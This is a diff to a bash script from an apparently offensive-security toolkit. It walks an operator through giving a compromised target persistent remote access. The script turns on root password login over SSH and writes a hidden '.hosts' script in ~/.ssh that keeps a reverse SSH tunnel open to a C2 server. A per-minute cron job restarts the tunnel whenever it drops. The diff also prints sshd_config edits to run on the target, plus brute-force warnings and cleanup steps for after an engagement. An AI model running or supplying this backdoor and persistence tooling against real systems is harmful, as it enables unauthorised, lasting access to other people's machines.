@@ -647,7 +647,31 @@ do
 			sed -i -e '0,/PubkeyAuthentication/!b' -e '/PubkeyAuthentication/s/^#//' /etc/ssh/sshd_config
 			sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/sshd_config
 			sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^#//' /etc/ssh/sshd_config
-			sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/ssh_config
+				read -p "Are you logged in as root [y|n]? " rootuser
+			echo ""
+			
+				if [ "$rootuser" == "y" ]; then
+					sed -i -e '0,/PermitRootLogin/!b' -e '/PermitRootLogin/s/^#//' /etc/ssh/sshd_config
+					#Uncomment PermitRootLogin
+					sed -i "/PermitRootLogin/s/prohibit-password/yes/" /etc/ssh/sshd_config
+					#Change PermitRootLogin to yes
+					echo ""
+					echo -e "\e[1;34mSSH root user login with password temporarily enabled..\e[0m"
+					read -p "Press any key to contiue" enter
+					clear				
+				else
+					echo ""
+				fi
+#Uncomment PermitRootLogin, leaves root account open to brute force attacks; but needed for Kali, root users, etc.
+#sed -i -e '0,/PermitRootLogin/!b' -e '/PermitRootLogin/s/^#//' /etc/ssh/sshd_config (verified command works)
+#Added step to disable password based SSH auth once cert auth setup is complete; this should resolve any brute-force vuln
+
+#On Kali (or any OS where you are logged in as root) you need to set "PermitRootLogin yes" until the setup is complete
+#sed -i "/PermitRootLogin/s/prohibit-password/yes/" /etc/ssh/sshd_config (verified command works)
+
+#Once complete set "PermitRootLogin prohibit-password" needs to be set so the root account cannat be ssh brute-forced
+#sed -i "/PermitRootLogin/s/yes/prohibit-password/" /etc/ssh/sshd_config
+						
 			service ssh restart
 			echo -e "\e[1;34mHit \"Enter\" Twice To Accept No Passphrase\e[0m"
 			ssh-keygen -t rsa -f ~/.ssh/at_rsa
@@ -666,9 +690,37 @@ do
 			echo -e "\e[1;34m**YOUR at_rsa.pub KEY *MUST* BE ADDED TO THE ~/.ssh/authorized_keys FILE ON YOUR TARGET**\e[0m"
 			echo -e "\e[1;34m::::::::::::THE FOLLOWING STEP IS TO BE DONE ON YOUR TARGET::::::::::::\e[0m"
 			echo -e "\E[1;34m\e[97m \e[31mcat ~/.ssh/at_rsa.pub >> ~/.ssh/authorized_keys\e[97m\E[1;34m"
+			echo ""
             ;;
         "Persistent SSH Session Generator")
-			echo -e "\e[1;34m**Step 1 - Create The Persistence (Self Healing SSH Connection) Script To Run On Your Target**\e[0m"
+			echo -e "\e[1;34mStep 1 - Enable SSH Public Key & Password Authentication On Target By Running This Command On Target:\e[0m"
+			echo ""
+			echo -e "\E[1;34m\e[97m \e[31msudo sed -i -e '0,/PubkeyAuthentication/!b' -e '/PubkeyAuthentication/s/^#//' /etc/ssh/sshd_config && sudo sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/sshd_config && sudo sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^#//' /etc/ssh/sshd_config\e[97m\E[1;34m"
+#Remove ssh_config edit that is contained in the line below
+#echo -e "\E[1;34m\e[97m \e[31msed -i -e '0,/PubkeyAuthentication/!b' -e '/PubkeyAuthentication/s/^#//' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/sshd_config && sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^#//' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/ssh_config\e[97m\E[1;34m"
+
+#Maybe needed to prevent ssh brutforce vuln?
+#sed -i -e '0,/PermitRootLogin/!b' -e '/PermitRootLogin/s/^#//' /etc/ssh/sshd_config
+#Added step to disable password based SSH auth once cert auth setup is complete; this should resolve any brute-force vuln
+						read -p "Is your compromised target logged in as root [y|n]? " rootuser
+			echo ""
+			
+				if [ "$rootuser" == "y" ]; then
+					echo -e "\e[1;34mEnable SSH root User Login via Password Authentication On Target By Running This Command On Target: \e[0m"
+					echo -e "\E[1;34m\e[97m \e[31msed -i -e '0,/PermitRootLogin/!b' -e '/PermitRootLogin/s/^#//' /etc/ssh/sshd_config && sed -i \"/PermitRootLogin/s/prohibit-password/yes/\" /etc/ssh/sshd_config\e[97m\E[1;34m"
+					#Uncomment PermitRootLogin
+					#Change PermitRootLogin to yes
+					echo ""
+					echo -e "\e[1;34mSSH root user login with password temporarily enabled..\e[0m"
+					read -p "Press any key to contiue" enter
+					clear				
+				else
+					echo "No additional changes required. Moving on.."
+				fi
+			echo ""
+			read -p "Press Enter When Ready To Proceed"
+			echo ""
+			echo -e "\e[1;34m**Step 2 - Create The Persistence (Self Healing SSH Connection) Script To Run On Your Target**\e[0m"
 			read -p 'Set Local SSH Port On Target (i.e., 1081): ' userlport; read -p 'Set SSH Port On C2 Server (i.e., 22): ' userrport; read -p 'Set Username On C2 Server: ' username; read -p 'Set IP/Domain Name Of C2 Server: ' userhost;
 			touch ~/ATAT/.hosts
 			echo -e "#!/bin/bash" > ~/ATAT/.hosts
@@ -679,7 +731,7 @@ do
 			echo -e "    echo \"Tunnel is not running, Starting service.\"" >> ~/ATAT/.hosts
 			echo -e "    ssh -N -R "$userlport":localhost:"$userrport" "$username"@"$userhost"" >> ~/ATAT/.hosts
 			echo -e "fi" >> ~/ATAT/.hosts
-			echo -e "\e[1;34m**Step 2 - Move ~/ATAT/.hosts Script To Target (Recommend Placing It In ~/.ssh/)**\e[0m"
+			echo -e "\e[1;34m**Step 3 - Move ~/ATAT/.hosts Script To Target (Recommend Placing It In ~/.ssh/)**\e[0m"
 			echo -e "\e[1;34mExample Command:\e[0m"
 			echo -e "\E[1;34m\e[97m \e[31mscp ~/ATAT/.hosts TARGET_USERNAME@TARGET_IP:~/.ssh\e[97m\E[1;34m"
 			echo -e "\e[1;34mOR\e[0m"
@@ -695,11 +747,11 @@ do
 
 			read -p "Press Enter When Ready To Proceed"		
 			echo ""
-			echo -e "\e[1;34m**Step 3 - Make Script Executable By Running This Command In Terminal On Your Target (Your Teminal Window Must \"cd\" Into The Directory Where You Placed The Script):**\e[0m"
+			echo -e "\e[1;34m**Step 4 - Make Script Executable By Running This Command In Terminal On Your Target (Your Teminal Window Must \"cd\" Into The Directory Where You Placed The Script):**\e[0m"
 			echo -e "\E[1;34m\e[97m \e[31mchmod +x .hosts\e[97m\E[1;34m"
 			echo ""
 			read -p "Press Enter When Ready To Proceed"
-			echo -e "\e[1;34m**Step 4 - Make Script Monitor & Repair The Connetion When Necessary**\e[0m"
+			echo -e "\e[1;34m**Step 5 - Make Script Monitor & Repair The Connetion When Necessary**\e[0m"
 			echo -e "\e[1;34mNow Start The Crontab (Schedule The Job) With This Command:\e[0m"
 			echo -e "\E[1;34m\e[97m \e[31mcrontab -e\e[97m\E[1;34m"
 			echo -e "\e[1;34mPlace the line below in as your cron job (a once per minute check to see if the ssh connection is up, if not, attempt to bring it up):\e[0m"
@@ -707,10 +759,6 @@ do
 			echo -e "\e[1;34mMAKE SURE To Enter YOUR Correct Path For The .hosts File & The SSH Log File!!\e[0m"
 			echo -e "\E[1;34m\e[97m \e[31m*/1 * * * * /path/to/.hosts > /home/<user>/.ssh/tunnel.log 2>&1\e[97m\E[1;34m"
 			read -p "Press Enter When Ready To Proceed"
-			echo ""
-			echo -e "\e[1;34mStep 5 - Enable SSH Public Key & Password Authentication On Target By Running This Command On Target:\e[0m"
-			echo ""
-			echo -e "\E[1;34m\e[97m \e[31msed -i -e '0,/PubkeyAuthentication/!b' -e '/PubkeyAuthentication/s/^#//' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/sshd_config && sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^#//' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/ssh_config\e[97m\E[1;34m"
 			echo ""
 			echo -e "\e[1;34m**Step 6 - Generate SSH Authentication Certificate On Target & Move Public Key To C2 Server**\e[0m"
 			echo -e "\e[1;34mRun This Command On Your Target:\e[0m"
@@ -729,7 +777,7 @@ EOF
 			echo ""
 			echo -e "\e[1;34m::::::::::::THESE FOLLOWING STEPS ARE TO BE DONE ON YOUR C2 Server::::::::::::\e[0m"
 			echo ""
-			echo -e "\e[1;34m**Step 5a - Make Sure You Have Run The \"Configure C2 Server For Persistent SSH Session\" Option On The C2 Server So It Is Ready To Accept The Connection**\e[0m"
+			echo -e "\e[1;34m**Step 7 - Make Sure You Have Run The \"Configure C2 Server For Persistent SSH Session\" Option On The C2 Server So It Is Ready To Accept The Connection**\e[0m"
 cat << "EOF"
 Also, you need to add your Target's public key to the ~/.ssh/authorized_keys file. If you do not have a ~/.ssh/authorized_keys file, you can create one as follows:
 EOF
@@ -749,11 +797,39 @@ EOF
 			echo -e "\E[1;34m\e[97m \e[31mssh -l TARGET_USERNAME -p "$userlport" localhost \e[97m\E[1;34m"
 			echo -e "\e[1;34m**MAKE SURE** To Enter The Correct Username For The Target. Then Enter The SSH Password For The Target When Prompted. \e[0m"
 			echo ""
+			read -p "Press Enter When Ready To Proceed"
+			echo -e "\e[1;34m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\e[0m"		
+			echo -e "\e[1;34m:::::::::::THE FOLLOWING STEP IS TO BE DONE ON YOUR TARGET & C2 TO DISABLE SSH PASSWORD AUTH:::::::::::\e[0m"
+			echo -e "\e[1;34mThis only needs to be done if you do *not* need SSH password based authentication enabled on either host;\e[0m"
+			echo -e "\e[1;34mand can be done because certificate based authentication is now setup; therefore, password auth is no longer required\e[0m"
+			echo -e "\E[1;34m\e[97m \e[31msed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^/#/' /etc/ssh/sshd_config\e[97m\E[1;34m"
+			echo ""
+			echo -e "\e[1;34mAgain, this step to disable SSH password authentication is OPTIONAL\e[0m"
+			echo ""
+	echo -e "\e[1;34m***IF YOUR C2 AND/OR TARGET ARE LOGGED IN AS ROOT:***\e[0m"
+	echo -e "\e[1;34mSSH password auth for the root user was enabled for the setup process.\e[0m"
+	echo -e "\e[1;34mYou *NEED* to enter this command on your C2 and/or Target to prevent brute-force attacks against the root user.\e[0m"
+	echo ""
+	echo -e "\E[1;34m\e[97m \e[31msed -i \"/PermitRootLogin/s/yes/prohibit-password/\" /etc/ssh/sshd_config && service ssh restart\e[97m\E[1;34m"
+	echo ""
+	echo "No additional changes for setup are required."		
+			echo""
+			read -p "Press Enter When Ready To Proceed"
+			echo ""
+			echo "No additional changes for setup are required."
+			echo ""
 			echo -e "\e[1;34m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\e[0m"		
 			echo -e "\e[1;34m::::::::::::THESE FOLLOWING STEPS ARE TO BE DONE ON YOUR TARGET ONCE ENGAGEMENT IS COMPLETE::::::::::::\e[0m"
 			echo -e "\e[1;34m****CLEAN UP NOTES FOR SSH CONFIG ON TARGET****\e[0m"
 			echo -e "\e[1;34m***To Disable SSH Public Key & Password Authentication On Target (Once Done, If Necessary) Run:***\e[0m"
-			echo -e "\E[1;34m\e[97m \e[31msed -i -e '0,/PubkeyAuthentication/!b' -e '/PubkeyAuthentication/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^/#/' /etc/ssh/ssh_config\e[97m\E[1;34m"
+			echo -e "\E[1;34m\e[97m \e[31msed -i -e '0,/PubkeyAuthentication/!b' -e '/PubkeyAuthentication/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^/#/' /etc/ssh/sshd_config\e[97m\E[1;34m"
+#Remove ssh_config edit that is contained in the line below
+#echo -e "\E[1;34m\e[97m \e[31msed -i -e '0,/PubkeyAuthentication/!b' -e '/PubkeyAuthentication/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^/#/' /etc/ssh/ssh_config\e[97m\E[1;34m"
+
+#Maybe needed to prevent ssh brutforce vuln?
+#sed -i -e '0,/PermitRootLogin/!b' -e '/PermitRootLogin/s/^/#/' /etc/ssh/sshd_config
+#Added step to disable password based SSH auth once cert auth setup is complete; this should resolve any brute-force vuln
+
 			echo ""
 			echo -e "\e[1;34m***Remove The Line In ~/.ssh/authorized_keys That Matches The Contents Of ~/.ssh/at_rsa.pub***\e[0m"
 			echo ""
@@ -762,6 +838,7 @@ EOF
 			echo -e "\e[1;34m~/.ssh/tunnel.log\e[0m"
 			echo -e "\e[1;34m~/.ssh/.hosts\e[0m"
 			echo ""
+			read -p "Press Enter When Ready To Proceed"
 			;; 
         "Android")
         read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport;
